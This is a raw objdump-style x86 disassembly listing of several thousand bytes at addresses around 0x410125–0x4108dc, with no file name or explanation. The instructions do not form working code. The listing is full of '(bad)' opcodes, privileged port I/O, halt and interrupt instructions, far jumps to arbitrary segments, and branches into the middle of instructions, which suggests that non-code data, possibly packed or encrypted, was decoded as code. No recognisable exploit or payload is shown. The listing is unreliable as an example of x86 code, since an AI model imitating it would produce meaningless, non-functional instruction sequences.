  410125:	lea    edi,[edx-0x2f]
  410128:	mov    ebp,0x296bb418
  41012d:	mov    ss,ebx
  41012f:	mov    ah,0xf9
  410131:	sbb    BYTE PTR [ebx],0xa3
  410134:	outs   dx,DWORD PTR ds:[esi]
  410135:	lods   al,BYTE PTR ds:[esi]
  410137:	hlt    
  410138:	out    0xca,al
  41013a:	aad    0xf
  41013c:	fsubr  DWORD PTR [esi-0x690e239b]
  410142:	pop    eax
  410143:	ficomp WORD PTR [edi]
  410145:	out    dx,eax
  410146:	rol    BYTE PTR [edi-0x61],0xdc
  41014a:	adc    eax,0x5c263fbb
  41014f:	adc    DWORD PTR [edi+0x7d],edx
  410152:	jle    0x410154
  410154:	cmp    eax,0xc412f0ae
  410159:	sbb    dh,BYTE PTR [edi+0x9dd41fa]
  41015f:	push   eax
  410160:	pop    edi
  410161:	jp     0x4101dc
  410163:	arpl   WORD PTR ds:0x17fa4b16,sp
  410169:	pop    ss
  41016a:	jno    0x4100f0
  41016c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41016d:	test   DWORD PTR [edx-0x6f],ebp
  410170:	or     eax,0xb7e610c2
  410175:	dec    edi
  410176:	pop    ecx
  410177:	mov    ds:0x1a737087,eax
  41017c:	jns    0x4101f0
  41017e:	xchg   esp,eax
  41017f:	dec    eax
  410180:	sbb    BYTE PTR [ebx],ch
  410182:	fsub   DWORD PTR [edi-0x7045a46c]
  410188:	ja     0x41014e
  41018a:	adc    al,0x76
  41018c:	loope  0x410147
  41018e:	cld    
  41018f:	(bad)  
  410190:	jp     0x4101a8
  410192:	mov    edi,ebx
  410194:	mov    edi,0xb152d2a9
  410199:	pop    esi
  41019a:	sub    DWORD PTR [ebp-0x6f],ebp
  41019d:	ss mov cl,0xf
  4101a0:	push   edi
  4101a1:	dec    ecx
  4101a2:	sub    ebx,DWORD PTR [esi-0x6569cbb3]
  4101a8:	and    al,0xfe
  4101aa:	aaa    
  4101ab:	retf   0xdb5e
  4101ae:	mov    cl,0xb7
  4101b0:	pop    ebx
  4101b1:	sub    eax,0x8703e04
  4101b6:	or     al,0x4b
  4101b8:	mov    edx,0x945975a0
  4101bd:	aam    0x21
  4101bf:	std    
  4101c0:	xchg   edx,eax
  4101c1:	xor    eax,0x9e2b8992
  4101c6:	add    BYTE PTR ss:[edx+0x3880214b],bl
  4101cd:	stos   BYTE PTR es:[edi],al
  4101ce:	and    BYTE PTR [ebx],dl
  4101d0:	fxtract 
  4101d2:	int    0xe4
  4101d4:	aas    
  4101d5:	stos   DWORD PTR es:[edi],eax
  4101d6:	adc    DWORD PTR [ecx],edx
  4101d8:	(bad)  
  4101da:	jns    0x4101a1
  4101dc:	xchg   ebx,eax
  4101dd:	cmp    DWORD PTR [esi],ecx
  4101df:	push   ebp
  4101e0:	scas   al,BYTE PTR es:[edi]
  4101e1:	mov    ebx,ecx
  4101e3:	nop
  4101e4:	ret    0x1b8d
  4101e7:	sub    DWORD PTR [edi],edx
  4101e9:	sbb    ah,bl
  4101eb:	pop    edi
  4101ec:	sbb    al,0x63
  4101ee:	sbb    al,0x90
  4101f0:	sar    BYTE PTR [ecx],1
  4101f2:	dec    eax
  4101f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101f4:	cli    
  4101f5:	loop   0x4101c2
  4101f7:	pop    ss
  4101f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101f9:	mov    bl,0xbe
  4101fb:	mov    BYTE PTR es:[ecx],0xe0
  4101ff:	xchg   BYTE PTR [ecx+0x4af56353],cl
  410205:	pusha  
  410206:	aam    0xe6
  410208:	mov    ss,edx
  41020a:	into   
  41020b:	xchg   bl,dl
  41020d:	frstor [ecx-0x7d]
  410210:	clc    
  410211:	pop    es
  410212:	jmp    0xdd89:0x3814119f
  410219:	cdq    
  41021a:	in     al,dx
  41021b:	jmp    0x45d5:0xd0bde03a
  410222:	test   al,0xac
  410224:	cmp    dl,bl
  410226:	and    al,0x37
  410228:	mov    ds:0x87170d9b,al
  41022d:	out    dx,eax
  41022e:	mul    dl
  410230:	cmp    eax,0xeea56f64
  410235:	xor    BYTE PTR ds:0x5de6f917,ah
  41023b:	xchg   edi,eax
  41023c:	mov    dh,0x92
  41023e:	add    eax,0xf301491
  410243:	xchg   edi,eax
  410244:	lahf   
  410245:	inc    esp
  410246:	xchg   ebp,eax
  410247:	clc    
  410248:	pop    ds
  410249:	mov    edi,0x6ced7f9e
  41024e:	or     eax,esp
  410250:	and    esp,DWORD PTR [edi+edi*8+0x75]
  410254:	scas   al,BYTE PTR es:[edi]
  410255:	adc    eax,DWORD PTR [ebx+0x29]
  410258:	cli    
  410259:	cdq    
  41025a:	lods   eax,DWORD PTR ds:[esi]
  41025b:	or     al,0x8b
  41025d:	scas   eax,DWORD PTR es:[edi]
  41025e:	or     esp,DWORD PTR [ebx+0x3dda166b]
  410264:	out    dx,eax
  410265:	dec    ebx
  410266:	mov    bh,0x4a
  410268:	(bad)  
  410269:	lds    ebx,FWORD PTR [ebx]
  41026b:	xor    ecx,edx
  41026d:	test   al,0x30
  41026f:	fsubr  QWORD PTR [esi+0x1e]
  410272:	loop   0x410203
  410274:	and    dh,BYTE PTR [eax+ebp*4+0x5c26946]
  41027b:	lods   eax,DWORD PTR ds:[esi]
  41027c:	loopne 0x410230
  41027e:	pushf  
  41027f:	clc    
  410280:	mov    esi,0xb538cbf1
  410285:	dec    ebp
  410286:	ss (bad) 
  410288:	xchg   ebp,eax
  410289:	ins    DWORD PTR es:[edi],dx
  41028a:	mov    ds:0x6779e707,al
  41028f:	pop    ebp
  410290:	aad    0x4c
  410292:	fsub   st,st(6)
  410294:	cmp    BYTE PTR [edx+ecx*8-0x45],al
  410298:	fldenv [edx-0x32]
  41029b:	xor    al,BYTE PTR [eax]
  41029d:	fwait
  41029e:	outs   dx,DWORD PTR ds:[esi]
  41029f:	inc    eax
  4102a0:	push   ebp
  4102a1:	div    DWORD PTR [edi]
  4102a3:	int    0xfb
  4102a5:	rcr    BYTE PTR [eax-0x30f07204],1
  4102ab:	(bad)  
  4102ac:	pop    eax
  4102ad:	xor    BYTE PTR [edx+ecx*4-0x4f],al
  4102b1:	retf   
  4102b2:	fwait
  4102b3:	les    ecx,FWORD PTR [eax+0x3623f934]
  4102b9:	mov    al,ds:0x83d6d17d
  4102be:	dec    esi
  4102bf:	ins    BYTE PTR es:[edi],dx
  4102c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102c1:	gs and edi,DWORD PTR ds:[eax-0x7c]
  4102c6:	mov    edx,0xd1903459
  4102cb:	and    edx,DWORD PTR [ebx-0x4d]
  4102ce:	xchg   esp,eax
  4102cf:	and    eax,0xd8338e3c
  4102d4:	daa    
  4102d5:	inc    esi
  4102d6:	and    BYTE PTR [ebp-0x9],dh
  4102d9:	mov    edi,es
  4102db:	inc    eax
  4102dc:	mov    eax,ds:0xc0e73e2b
  4102e1:	es push 0x57
  4102e4:	mov    eax,ds:0x28aaabd5
  4102e9:	and    al,0x78
  4102eb:	ret    
  4102ec:	mul    DWORD PTR gs:[ecx-0x59]
  4102f0:	out    dx,al
  4102f1:	mov    bh,0xa3
  4102f3:	lods   eax,DWORD PTR ds:[esi]
  4102f4:	pop    edi
  4102f5:	call   0x70afb438
  4102fa:	dec    ebx
  4102fb:	cmp    cl,BYTE PTR [eax-0x5d]
  4102fe:	inc    ecx
  4102ff:	mul    DWORD PTR [ebx+0x41182427]
  410305:	out    dx,al
  410306:	push   es
  410307:	into   
  410308:	xor    al,0xcb
  41030a:	cmp    ebp,DWORD PTR [eax]
  41030c:	into   
  41030d:	imul   ebp,DWORD PTR [ebx],0x38
  410310:	or     DWORD PTR [edi],0xbb36a27c
  410316:	sbb    bh,BYTE PTR [edx]
  410318:	out    0x7a,al
  41031a:	mov    cl,0x1a
  41031c:	or     eax,0x4da8050f
  410321:	mov    esp,0x8bd91883
  410326:	sbb    BYTE PTR [ecx],dh
  410328:	jg     0x4102ae
  41032a:	sbb    eax,0xfdccfcfc
  41032f:	and    edi,DWORD PTR [esi+0x1356318a]
  410335:	sbb    eax,0x5c6c86e5
  41033a:	lea    esp,[ecx+0x2e]
  41033d:	pop    esi
  41033e:	inc    ebx
  41033f:	dec    eax
  410340:	sbb    BYTE PTR [edx],ah
  410342:	imul   ebp,edx,0xe
  410345:	and    ebx,esp
  410347:	jp     0x4102f9
  410349:	out    dx,eax
  41034a:	mov    WORD PTR [bx+si+0x3df2],es
  41034f:	adc    ebx,DWORD PTR [ebp+0x67]
  410352:	push   es
  410353:	das    
  410354:	lock mov BYTE PTR [ecx],ah
  410357:	push   0x29463816
  41035c:	sti    
  41035d:	std    
  41035e:	sbb    DWORD PTR [eax+eiz*2-0x3],0xa7cb69ad
  410366:	in     eax,0xd2
  410368:	loop   0x410332
  41036a:	inc    edi
  41036b:	or     eax,0x29397e56
  410370:	xor    DWORD PTR [ecx],eax
  410372:	cmp    BYTE PTR [edi+0x65a80fdd],dl
  410378:	in     eax,0xe2
  41037a:	dec    ebp
  41037b:	and    BYTE PTR [ebx+0x509d6ab],dh
  410381:	popf   
  410382:	inc    esi
  410383:	out    0x79,eax
  410385:	xlat   BYTE PTR ds:[ebx]
  410386:	push   0xffffffc3
  410388:	enter  0x921a,0xa5
  41038c:	in     al,dx
  41038d:	inc    ebx
  41038e:	dec    esp
  41038f:	mov    eax,0x913bb28b
  410394:	sbb    bl,BYTE PTR [esi-0x76505f4d]
  41039a:	int    0xa3
  41039c:	dec    ecx
  41039d:	out    0x6c,al
  41039f:	dec    ebp
  4103a0:	pop    edx
  4103a1:	dec    esi
  4103a2:	add    eax,0xedd7b789
  4103a7:	sub    DWORD PTR [edi+esi*2-0x6ad93e3d],0x620b1610
  4103b2:	bound  ebx,QWORD PTR [ebx+0x37]
  4103b5:	bound  ebp,QWORD PTR [ebx-0x384bcbcb]
  4103bb:	mov    al,ds:0x482b640c
  4103c0:	dec    esp
  4103c1:	adc    eax,DWORD PTR [eax+0x60]
  4103c4:	and    ecx,DWORD PTR [ecx-0x56]
  4103c7:	cmp    eax,0x248db939
  4103cc:	ds loope 0x4103bd
  4103cf:	repz inc esi
  4103d1:	mov    edx,0xce7903b9
  4103d6:	ficomp DWORD PTR [ecx]
  4103d8:	fsubr  st(2),st
  4103da:	and    eax,0x8e4f2ce5
  4103df:	jno    0x410427
  4103e1:	popf   
  4103e2:	test   DWORD PTR [ebx-0x7b],edx
  4103e5:	and    BYTE PTR [eax+0x3933890f],al
  4103eb:	mov    edx,0x64ec71d7
  4103f0:	int3   
  4103f1:	mov    edx,0x8c44eeff
  4103f6:	pop    eax
  4103f7:	cs cwde 
  4103f9:	sbb    al,0x9b
  4103fb:	std    
  4103fc:	popf   
  4103fd:	mov    ebx,0xe2f7598c
  410402:	xlat   BYTE PTR ds:[ebx]
  410403:	ins    BYTE PTR es:[edi],dx
  410404:	jnp    0x41038e
  410406:	adc    ah,BYTE PTR [ecx+edi*2-0xe]
  41040a:	pop    ebx
  41040b:	and    BYTE PTR [esi-0x5b],0x2c
  41040f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410410:	ret    0xf879
  410413:	mov    al,ah
  410415:	xor    bh,BYTE PTR [ebp-0x6f]
  410418:	add    al,0x18
  41041a:	imul   ecx,DWORD PTR [edi],0x5a
  41041d:	leave  
  41041e:	inc    eax
  41041f:	sbb    edi,edx
  410421:	mov    ah,0x64
  410423:	fsubr  QWORD PTR cs:[ebp+0x17f8e0c1]
  41042a:	cmp    dl,BYTE PTR ss:[edx-0x51]
  41042e:	call   0x9578:0xaf37a9ac
  410435:	out    0x3b,eax
  410437:	xchg   ecx,eax
  410438:	leave  
  410439:	ja     0x41045e
  41043b:	cmp    al,0xa0
  41043d:	ficomp WORD PTR [esi+0xf]
  410440:	nop
  410441:	and    bl,BYTE PTR [esi+0x78]
  410444:	call   0x244e7b79
  410449:	pop    esi
  41044a:	fs mov esp,0x23ae5d7f
  410450:	sub    eax,0xfecba9d1
  410455:	or     bh,0xec
  410458:	add    ch,BYTE PTR [ebx+0x552de4e0]
  41045e:	or     cl,cl
  410460:	mov    al,ds:0x8f184b27
  410465:	std    
  410466:	cwde   
  410467:	in     al,0xe5
  410469:	cmp    DWORD PTR ds:0x8a185c55,eax
  41046f:	push   ebx
  410470:	out    dx,al
  410471:	mov    dl,BYTE PTR ds:0xb7dffa05
  410477:	call   0x89e0ef8e
  41047c:	div    DWORD PTR [ebx]
  41047e:	outs   dx,BYTE PTR ds:[esi]
  41047f:	push   esp
  410480:	pop    edx
  410481:	lods   eax,DWORD PTR ds:[esi]
  410482:	add    BYTE PTR [esi+0x254a27f2],cl
  410488:	mov    al,ds:0xda72203a
  41048d:	mov    ?,WORD PTR [edi-0x3913822c]
  410493:	leave  
  410494:	ins    BYTE PTR es:[edi],dx
  410495:	aaa    
  410496:	jno    0x4104a2
  410498:	xchg   esp,eax
  410499:	xchg   DWORD PTR [ecx],eax
  41049b:	xor    DWORD PTR ds:0xf6ae00c8,ebx
  4104a1:	mov    ds:0x56cb0934,al
  4104a6:	mov    ch,0x88
  4104a8:	jns    0x410465
  4104aa:	xor    al,0xf6
  4104ac:	xor    bh,BYTE PTR [eax-0x52]
  4104af:	and    esp,esi
  4104b1:	sahf   
  4104b2:	je     0x4104c2
  4104b4:	dec    eax
  4104b5:	mov    bh,0xb4
  4104b7:	cmp    dl,BYTE PTR [ebp+0x5a]
  4104ba:	mov    al,ds:0x2957ea7e
  4104bf:	xchg   DWORD PTR es:[ebx+eiz*1-0x65e1c107],esp
  4104c7:	push   esi
  4104c8:	inc    edx
  4104c9:	xchg   esi,eax
  4104ca:	lea    ebp,[eiz*1-0x73aaf8b6]
  4104d1:	and    al,0xec
  4104d3:	push   0xffffffdf
  4104d5:	mov    edi,0xf2a62f91
  4104da:	test   DWORD PTR [eax],ebp
  4104dc:	sbb    bl,BYTE PTR [eax+0x51be7c7b]
  4104e2:	adc    BYTE PTR [edx-0x3c],dl
  4104e5:	jno    0x41054a
  4104e7:	and    bl,bh
  4104e9:	inc    edx
  4104ea:	push   edi
  4104eb:	fmul   QWORD PTR [ecx]
  4104ed:	addr16 xchg ecx,eax
  4104ef:	jo     0x41047d
  4104f1:	pushf  
  4104f2:	mov    DWORD PTR ds:0x302c64e8,edi
  4104f8:	fstp   QWORD PTR [eax-0x59]
  4104fb:	pop    ebx
  4104fc:	pop    ebp
  4104fd:	mov    edx,0xfbe4a9ce
  410502:	les    eax,FWORD PTR [ecx]
  410504:	mov    ch,BYTE PTR [eax]
  410506:	push   ds
  410507:	mov    cl,0x42
  410509:	shl    DWORD PTR [edx+0x20eb2d9d],1
  41050f:	xchg   esi,eax
  410510:	outs   dx,BYTE PTR ds:[esi]
  410511:	out    dx,al
  410512:	retf   0x52a3
  410515:	add    bh,dl
  410517:	pop    esi
  410518:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410519:	jae    0x410583
  41051b:	cmp    ah,BYTE PTR [esi+0x2a]
  41051e:	pusha  
  41051f:	retf   
  410520:	xchg   ebx,eax
  410521:	daa    
  410522:	(bad)
  410525:	xchg   esp,eax
  410526:	lds    eax,FWORD PTR [ebp-0x79]
  410529:	xchg   edi,eax
  41052a:	rcr    DWORD PTR [esp+eiz*2],1
  41052d:	retf   0x39ab
  410530:	jo     0x410518
  410532:	pop    ebx
  410533:	outs   dx,BYTE PTR ds:[esi]
  410534:	xchg   edx,ebx
  410536:	adc    dh,BYTE PTR [ebp+0x490c8d54]
  41053c:	add    BYTE PTR [edx+0x5775713a],0x8c
  410543:	xchg   ebp,eax
  410544:	aas    
  410545:	imul   edi,DWORD PTR [eax],0x537b475d
  41054b:	dec    ecx
  41054c:	push   0xffffffaf
  41054e:	add    BYTE PTR [esi],ch
  410550:	inc    ebx
  410551:	out    0xf7,al
  410553:	and    eax,0x60402770
  410558:	mov    bl,0xe
  41055a:	dec    esi
  41055b:	jl     0x41053e
  41055d:	ret    
  41055e:	adc    DWORD PTR [edx+0x1fcd9f66],edi
  410564:	mov    WORD PTR [esi+ebx*4+0x44],fs
  410568:	inc    eax
  410569:	cwde   
  41056a:	bound  esp,QWORD PTR [ebp-0x59a11a09]
  410570:	(bad)  
  410571:	addr16 push esi
  410573:	mov    cs,WORD PTR [esi+ebp*4+0x416ac975]
  41057a:	in     al,dx
  41057b:	cmp    esi,DWORD PTR [esi+esi*1-0x8]
  41057f:	dec    ebp
  410580:	mov    eax,0xec5e6ede
  410585:	js     0x4105e1
  410587:	stos   BYTE PTR es:[edi],al
  410588:	iret   
  410589:	ret    
  41058a:	jecxz  0x410514
  41058c:	js     0x410586
  41058e:	pop    ecx
  41058f:	xchg   esi,eax
  410590:	retf   0x60a7
  410593:	je     0x41052f
  410595:	mov    cl,0x78
  410597:	ret    
  410598:	add    edx,edx
  41059a:	adc    DWORD PTR [edi],ebp
  41059c:	test   al,0x18
  41059e:	dec    BYTE PTR [edx-0x2a066d95]
  4105a4:	xchg   bl,ch
  4105a6:	bound  ecx,QWORD PTR [ebx-0x40c3f131]
  4105ac:	mov    ds:0x807fbb47,eax
  4105b1:	push   cs
  4105b2:	jge    0x410594
  4105b4:	in     al,0x9a
  4105b6:	idiv   ah
  4105b8:	in     eax,dx
  4105b9:	in     al,dx
  4105ba:	in     al,0x3b
  4105bc:	pop    ebx
  4105bd:	loop   0x4105bd
  4105bf:	cmp    eax,0xeffce151
  4105c4:	mov    dh,0x1c
  4105c6:	or     al,0x6
  4105c8:	lahf   
  4105c9:	xchg   ebx,eax
  4105ca:	popa   
  4105cb:	cmp    al,0xdc
  4105cd:	pusha  
  4105ce:	scas   eax,DWORD PTR es:[edi]
  4105cf:	or     DWORD PTR [edx-0x269550bd],edi
  4105d5:	mov    edi,0x581f7dd4
  4105da:	dec    esp
  4105db:	mov    ds:0x81ca1686,al
  4105e0:	sub    al,0x89
  4105e2:	nop
  4105e3:	mov    ebx,DWORD PTR [edi+0x49]
  4105e6:	dec    eax
  4105e7:	cs retf 0xace6
  4105eb:	dec    eax
  4105ec:	cmp    BYTE PTR [ecx+0x13],dl
  4105ef:	fwait
  4105f0:	sbb    BYTE PTR [ecx-0x1e],cl
  4105f3:	fdiv   DWORD PTR [eax-0x5274174]
  4105f9:	mul    DWORD PTR [esi]
  4105fb:	xor    ah,dl
  4105fd:	dec    edx
  4105fe:	push   0xfffffff8
  410600:	lods   al,BYTE PTR ds:[esi]
  410601:	shr    BYTE PTR [ecx],1
  410603:	jne    0x410622
  410605:	cmp    BYTE PTR [edx+0x39],dl
  410608:	ins    BYTE PTR es:[edi],dx
  410609:	push   edi
  41060a:	(bad)  
  41060b:	(bad)  
  41060c:	or     eax,0x3025497f
  410611:	push   ecx
  410612:	xchg   edx,eax
  410613:	imul   ebx,DWORD PTR gs:[ebx+0x36],0x4527d1e6
  41061b:	jmp    0x4105ac
  41061d:	ins    BYTE PTR es:[edi],dx
  41061e:	jp     0x4105a1
  410620:	inc    edi
  410621:	mov    ebx,ss
  410623:	add    DWORD PTR [eax],0x4d
  410626:	dec    esp
  410627:	scas   eax,DWORD PTR es:[edi]
  410628:	pop    ecx
  410629:	mov    cl,0xbf
  41062b:	je     0x4105e3
  41062d:	fwait
  41062e:	and    DWORD PTR [eax-0x5d],0xffffffc9
  410632:	adc    ah,BYTE PTR [ebp-0x61]
  410635:	call   0xb84c:0xde23d327
  41063c:	cmp    al,0xca
  41063e:	mov    edi,0xa99c810b
  410643:	int    0xdc
  410645:	test   DWORD PTR [edx-0x3b91e950],0xd44ee87b
  41064f:	ins    BYTE PTR es:[edi],dx
  410650:	(bad)  
  410651:	sbb    eax,0x10efc18f
  410656:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410657:	cmp    BYTE PTR [eax+0x3d],ah
  41065a:	jg     0x410651
  41065c:	lgs    esi,FWORD PTR ds:0x651a154
  410663:	out    0x6b,eax
  410665:	fistp  QWORD PTR [esi+0x5ba3f5da]
  41066b:	sbb    DWORD PTR [edi-0x4c],0x23
  41066f:	sub    BYTE PTR [ecx+0x43],dh
  410672:	(bad)  
  410673:	fbstp  TBYTE PTR [ebx+ecx*1-0x49]
  410677:	(bad)  
  410678:	jbe    0x4106b2
  41067a:	add    eax,0x1a5a0565
  41067f:	push   esi
  410680:	mov    ecx,0x776400f1
  410685:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410686:	cmp    BYTE PTR [ebp+0x5551b3b3],cl
  41068c:	dec    ebp
  41068d:	or     eax,0xe3f193f9
  410692:	jbe    0x41068a
  410694:	mov    esi,0x75e525b0
  410699:	fistp  DWORD PTR [edi]
  41069b:	idiv   DWORD PTR ds:0xda774473
  4106a1:	rcl    DWORD PTR [edx+esi*1+0x17],cl
  4106a5:	add    eax,0x1f37385
  4106aa:	mov    bl,0x61
  4106ac:	popa   
  4106ad:	sub    eax,0x451d483d
  4106b2:	jle    0x410640
  4106b4:	rcl    BYTE PTR [ebx+0x3935f16a],1
  4106ba:	mov    esi,0x1acc1763
  4106bf:	pop    edi
  4106c0:	mov    ebp,0xab394c35
  4106c5:	jno    0x410743
  4106c7:	jl     0x41073c
  4106c9:	mov    bh,0xb7
  4106cb:	mov    bh,0xc3
  4106cd:	push   es
  4106ce:	outs   dx,DWORD PTR ds:[esi]
  4106cf:	aaa    
  4106d0:	lods   al,BYTE PTR ds:[esi]
  4106d1:	fidivr WORD PTR [ebp+0x65512ab0]
  4106d7:	cmp    ecx,DWORD PTR [ebx+0x18]
  4106da:	and    al,0x55
  4106dc:	inc    esp
  4106dd:	push   0xd97caceb
  4106e2:	call   0x3275:0xb4b49ec3
  4106e9:	dec    esp
  4106ea:	mov    DWORD PTR [edi+0x2d],esi
  4106ed:	dec    ebx
  4106ee:	dec    ebx
  4106ef:	cs pushf 
  4106f1:	dec    esp
  4106f2:	adc    eax,0xa727f7b7
  4106f7:	dec    esi
  4106f8:	mov    ebx,0x905f2612
  4106fd:	push   edi
  4106fe:	aad    0xee
  410700:	fdivr  QWORD PTR [eax+0x77]
  410703:	stc    
  410704:	repnz cs inc ebp
  410707:	inc    esp
  410708:	ins    BYTE PTR es:[edi],dx
  410709:	in     al,0x6a
  41070b:	jmp    0x36fe:0xcf70ef99
  410712:	cwde   
  410713:	adc    DWORD PTR [ecx+0x22afd0b8],0xffffffb5
  41071a:	sbb    al,0x88
  41071c:	push   ss
  41071d:	retf   0xbcb5
  410720:	(bad)  
  410721:	(bad)  
  410722:	lods   al,BYTE PTR ds:[esi]
  410723:	pop    edx
  410724:	loopne 0x4106b7
  410726:	stc    
  410727:	jp     0x41073b
  410729:	fwait
  41072a:	nop
  41072b:	mov    es,WORD PTR [edi+ecx*2-0x2c5646f2]
  410732:	mov    dl,0xd4
  410734:	jl     0x4106ef
  410736:	loope  0x4106bd
  410738:	adc    DWORD PTR [ecx+0x76],0x90532918
  41073f:	xlat   BYTE PTR ds:[ebx]
  410740:	mov    DWORD PTR [esi],esi
  410742:	(bad)  
  410743:	push   edi
  410744:	jno    0x4107b6
  410746:	xchg   ecx,eax
  410747:	les    esp,FWORD PTR [ebx-0x662f35e9]
  41074d:	aas    
  41074e:	cwde   
  41074f:	xchg   DWORD PTR ds:0xa5814831,ecx
  410755:	cs stos BYTE PTR es:[edi],al
  410757:	cmp    eax,DWORD PTR [esi-0x11]
  41075a:	cmp    al,0xb8
  41075c:	cmp    al,0xfa
  41075e:	shr    DWORD PTR [eax],0x2e
  410761:	adc    ebx,DWORD PTR [ebx-0x49174481]
  410767:	js     0x41074c
  410769:	stos   BYTE PTR es:[edi],al
  41076a:	je     0x4106fc
  41076c:	mov    ah,0xc9
  41076e:	adc    BYTE PTR [edi-0x64a9ff41],cl
  410774:	sbb    DWORD PTR [eax],edx
  410776:	inc    ebp
  410777:	in     eax,0x7a
  410779:	push   0x2d
  41077b:	lods   eax,DWORD PTR ds:[esi]
  41077c:	jb     0x4107a3
  41077e:	mov    ds:0xa7952543,eax
  410783:	je     0x410737
  410785:	fnstsw WORD PTR [esi+edx*8+0x64]
  410789:	addr16 inc ecx
  41078b:	push   0xa317e2a2
  410790:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410791:	retf   0xf9a9
  410794:	pop    esi
  410795:	int    0x2c
  410797:	lods   al,BYTE PTR ds:[esi]
  410798:	mov    es,WORD PTR [eax+0x34e9fc82]
  41079e:	push   esi
  41079f:	push   cs
  4107a0:	mov    cl,0x67
  4107a2:	xor    al,0xa4
  4107a4:	jmp    0x7226:0x2440627d
  4107ab:	dec    esi
  4107ac:	and    ecx,DWORD PTR [ebx]
  4107ae:	jg     0x4107a9
  4107b0:	mov    edx,esp
  4107b2:	add    cl,BYTE PTR [ebp+0x73e40eed]
  4107b8:	sub    eax,0x3a
  4107bb:	pop    esp
  4107bc:	adc    BYTE PTR [ecx+0x5ce630a],al
  4107c2:	xchg   DWORD PTR [eax-0x62],ecx
  4107c5:	arpl   di,si
  4107c7:	(bad)  
  4107c8:	ds test ebx,edi
  4107cb:	pushf  
  4107cc:	mov    al,0xfd
  4107ce:	retf   0xbe67
  4107d1:	arpl   WORD PTR [eax+0x571d1d41],cx
  4107d7:	std    
  4107d8:	lock xchg DWORD PTR [ebp-0x1c],ebp
  4107dc:	pop    ebp
  4107dd:	outs   dx,DWORD PTR ds:[esi]
  4107de:	dec    esp
  4107df:	push   eax
  4107e0:	out    dx,eax
  4107e1:	pop    edx
  4107e2:	xor    DWORD PTR [eax],esi
  4107e4:	fwait
  4107e5:	pop    eax
  4107e6:	inc    edi
  4107e7:	fidivr WORD PTR [ebx-0xa85ae9]
  4107ed:	out    0xb2,al
  4107ef:	es repnz stos BYTE PTR es:[edi],al
  4107f2:	fwait
  4107f3:	imul   eax,DWORD PTR [esi+0x4b9c2c75],0xa3d01dc7
  4107fd:	dec    edx
  4107fe:	pop    esi
  4107ff:	push   edi
  410800:	jle    0x410794
  410802:	jb     0x41080a
  410804:	xor    DWORD PTR [eax+edi*1+0x22],esi
  410808:	push   eax
  410809:	leave  
  41080a:	loope  0x4107b6
  41080c:	ficomp DWORD PTR [edi-0x21cd8bcc]
  410812:	mov    eax,ds:0x1d79e1c9
  410817:	jle    0x4107eb
  410819:	cli    
  41081a:	aas    
  41081b:	mov    edx,0x6b58397e
  410820:	outs   dx,DWORD PTR ds:[esi]
  410821:	pop    edi
  410822:	ja     0x4107bd
  410824:	jno    0x410878
  410826:	pop    ds
  410827:	dec    ebp
  410828:	inc    edi
  410829:	add    BYTE PTR [ebx-0x73fd3c6c],dh
  41082f:	push   eax
  410830:	sbb    cl,BYTE PTR [eax]
  410832:	test   al,0x2a
  410834:	daa    
  410835:	pop    es
  410836:	xchg   esi,eax
  410837:	add    cl,BYTE PTR [edi-0x3af09266]
  41083d:	cmp    DWORD PTR [edx],esp
  41083f:	sbb    ah,BYTE PTR [eax+0x4b]
  410842:	std    
  410843:	jge    0x410812
  410845:	sbb    al,0x5e
  410847:	into   
  410848:	cmp    al,0x66
  41084a:	cmp    al,0xe4
  41084c:	js     0x4108ae
  41084e:	stos   BYTE PTR es:[edi],al
  41084f:	inc    BYTE PTR [eax]
  410851:	jae    0x4108bc
  410853:	xor    bl,cl
  410855:	in     al,0xe1
  410857:	mov    dh,0x86
  410859:	inc    ebx
  41085a:	add    DWORD PTR [edx+0x4b],esi
  41085d:	mov    al,0xe2
  41085f:	out    0x58,eax
  410861:	jno    0x41089e
  410863:	outs   dx,BYTE PTR ds:[esi]
  410864:	dec    edi
  410865:	mov    ebx,DWORD PTR [eax-0x76]
  410868:	ficom  WORD PTR [ebx]
  41086a:	fwait
  41086b:	xor    dl,BYTE PTR [esi]
  41086d:	mov    eax,ds:0x1195f8bf
  410872:	loope  0x4108b9
  410874:	mov    BYTE PTR [edi-0x21],al
  410877:	rol    DWORD PTR [ebp+0x6],0x94
  41087b:	mov    WORD PTR [edx],fs
  41087d:	inc    esp
  41087e:	das    
  41087f:	xchg   edi,eax
  410880:	int3   
  410881:	pushf  
  410882:	push   ecx
  410883:	adc    edi,edx
  410885:	(bad)  
  410886:	int    0xc4
  410888:	mov    dh,0x9e
  41088a:	adc    BYTE PTR [esi],dh
  41088c:	cmp    ecx,DWORD PTR [ebx-0x49]
  41088f:	xlat   BYTE PTR ds:[ebx]
  410890:	or     ah,BYTE PTR [esi]
  410892:	std    
  410893:	out    dx,eax
  410894:	push   ds
  410895:	xchg   ebp,eax
  410896:	cmp    dh,BYTE PTR [ecx+0x12e60745]
  41089c:	shr    BYTE PTR [edx-0x25d7f6],cl
  4108a2:	inc    esi
  4108a3:	pop    esp
  4108a4:	xchg   edx,eax
  4108a5:	sub    dl,BYTE PTR [ebx+0x16]
  4108a8:	pushf  
  4108a9:	retf   
  4108aa:	jmp    0x18d95551
  4108af:	jb     0x410913
  4108b1:	jmp    0x410916
  4108b3:	or     BYTE PTR [edi],al
  4108b5:	(bad)  
  4108b6:	mov    ss,WORD PTR ds:0x489d59ba
  4108bc:	jne    0x410855
  4108be:	int3   
  4108bf:	push   ds
  4108c0:	xchg   esp,eax
  4108c1:	dec    eax
  4108c2:	adc    al,0x85
  4108c4:	xchg   ebp,eax
  4108c5:	or     ebx,DWORD PTR [ebp+0x59]
  4108c8:	xlat   BYTE PTR ds:[ebx]
  4108c9:	sbb    edi,DWORD PTR [eax+0x1fe0d9a7]
  4108cf:	loop   0x410950
  4108d1:	hlt    
  4108d2:	leave  
  4108d3:	pop    ebp
  4108d4:	xlat   BYTE PTR ds:[ebx]
  4108d5:	jo     0x410927
  4108d7:	add    DWORD PTR [edx],ecx
  4108d9:	jae    0x410957
  4108db:	pusha  
  4108dc:	sar    bl,cl
